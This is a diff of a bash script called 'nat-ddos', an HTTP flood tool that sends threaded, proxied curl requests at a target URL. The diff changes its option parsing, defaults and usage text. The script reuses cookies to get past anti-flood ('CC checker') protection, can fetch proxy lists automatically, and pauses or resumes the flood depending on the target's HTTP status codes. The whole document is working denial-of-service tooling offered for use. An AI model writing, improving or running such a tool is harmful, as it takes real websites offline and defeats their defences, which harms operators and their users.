@@ -29,16 +29,16 @@ function run {
 		do
 			[[ -z $(echo $i | attack $* 2> /dev/stdout) ]] && echo -n "[+$i] " || echo -n "[-$i] " 
 		done
-	[[ -z $nowait ]] && echo -e "\n[$(date)] Rest $rest second..." && sleep $rest || echo
-	[[ ! -z $killcurl ]] && killall -9 curl
-	[[ ! -z $autoattack || ! -z $stopcode ]] && local rescode=$(curl -I $* 2>/dev/null | grep "HTTP/" | awk -F" " '{print $2}')
-	[[ $stopcode == $rescode ]] && echo "[$(date)] Received HTTP $stopcode. Stopping attack now." && exit 0
-	[[ ! -z $autoattack ]] && {
-		[[ ! $rescode == 200 ]] && {
-			echo "[$(date)] Received HTTP $rescode. Attack paused."
-			checkstatus $*
+		[[ -z $nowait ]] && echo -e "\n[$(date)] Rest $rest second..." && sleep $rest || echo
+		[[ $killcurl == "true" ]] && killall -9 curl
+		[[ $autoattack == "on" || ! -z $stopcode ]] && local rescode=$(curl -I $* 2>/dev/null | grep "HTTP/" | awk -F" " '{print $2}')
+		[[ $stopcode == $rescode ]] && echo "[$(date)] Received HTTP $stopcode. Stopping attack now." && exit 0
+		[[ $autoattack == "on" ]] && {
+			[[ ! $rescode == 200 ]] && {
+				echo "[$(date)] Received HTTP $rescode. Attack paused."
+				checkstatus $*
+			}
 		}
-	}
 	done
 }
 
@@ -69,28 +69,29 @@ function genloop {
 
 function usage {
 	echo "usage: nat-ddos --url <target> [--proxys proxy_list]"
-	echo "                [--nowait] [--rest n] [--killcurl] [--thread n]"
-	echo "                [--load-cookies cookie] [--read-cookies]"
+	echo "                [--nowait] [--rest n] [--killcurl true|false] [--thread n]"
+	echo "                [--load-cookies cookie] [--read-cookies true|false]"
 	echo "                [--proxy-timeout n] [--stop-code HTTP_CODE]"
-	echo "                [--autoattack]"
+	echo "                [--autoattack on|off]"
 	echo 
 	echo "OPTIONS:"
 	echo "  --url				: The url to attack."
-	echo "  --proxys <proxy_list>		: The path to the proxy list file."
+	echo "  --proxys proxy_list		: The path to the proxy list file."
 	echo "  --nowait			: Do not wait for curl to end before starting"
 	echo "  				  a new attack."
 	echo "  --rest n			: Wait for n second before starting a new"
-	echo "  				  attack."
-	echo "  --killcurl			: Kill curl after an around of attack."
-	echo "  --thread n			: Using n threads to attack."
+	echo "  				  attack. (DEFAULT: 5)"
+	echo "  --killcurl true|false		: Kill curl after an around of attack."
+	echo "  --thread n			: Using n threads to attack. (DEFAULT: 5)"
 	echo "  --load-cookies cookie		: Load cookie from file."
-	echo "  --read-cookie			: Read cookie when attack, and load them during"
-	echo "  				  next time (bypass CC checker)."
+	echo "  --read-cookie true|false	: Read cookie when attack, and load them during"
+	echo "  				  next time (bypass CC checker). (DEFAULT: false)"
 	echo "  --proxy-timeout n		: Set a curl timeout of n seconds."
 	echo "  --stop-code HTTP_CODE		: Stop attack when receive given HTTP_CODE from "
 	echo "  				  target."
-	echo "  --autoattack			: Pause attack when receive a non-200 code from"
+	echo "  --autoattack on|off		: Pause attack when receive a non-200 code from"
 	echo "  				  target, and resume when receive 200."
+	echo "  				  (DEFAULT: off)"
 	echo
 	echo "NOTICE: "
 	echo "  if 'proxy_list' is not defined, will try to fetch one."
@@ -101,14 +102,14 @@ function usage {
 target=$(echo $*       | getarg url)
 thread=$(echo $*       | getarg thread)
 list=$(echo $*         | getarg proxys)
-nowait=$(echo $*       | grep nowait)
+nowait=$(echo $*       | getarg nowait)
 rest=$(echo $*         | getarg rest)
-killcurl=$(echo $*     | grep killcurl)
+killcurl=$(echo $*     | getarg killcurl)
 cookie_load=$(echo $*  | getarg load-cookie)
-read_cookies=$(echo $* | grep read-cookies)
+read_cookies=$(echo $* | getarg read-cookies)
 timeout=$(echo $*      | getarg proxy-timeout)
 stopcode=$(echo $*     | getarg stop-code)
-autoattack=$(echo $*   | grep autoattack)
+autoattack=$(echo $*   | getarg autoattack)
 
 [[ -z $thread  ]] && thread=5
 [[ -z $timeout ]] && timeout=15
